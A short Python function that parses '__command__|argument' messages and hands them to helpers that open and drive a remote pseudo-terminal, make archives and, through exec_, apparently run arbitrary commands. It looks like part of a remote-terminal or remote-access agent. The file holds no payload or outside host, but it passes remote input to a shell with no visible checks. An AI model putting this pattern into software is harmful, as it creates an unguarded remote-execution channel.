from _cmd_.cmd_func import add_register_id, make_archive, exec_
from _cmd_.pty_cmd import pty_connect, disconnect, pty_input, pty_resize

def cmd_check(raw_data):
    if raw_data.startswith('__'):
        data = raw_data.split("|")
        if data[0] == ('__register_id__'):
            add_register_id(data[1])
        elif data[0] == '__connect__':
            pty_connect(data[1])            
        elif data[0] == '__disconnect__':
            disconnect(data[1])            
        elif data[0] == '__pty_input__':
            pty_input(data[1])            
        elif data[0] == '__resize__':
            pty_resize(data[1])            
        elif data[0] == '__archive__':
            make_archive(data[1])
        elif data[0] == '__exec__':
            exec_(data[1])
        return True        
    else: return False
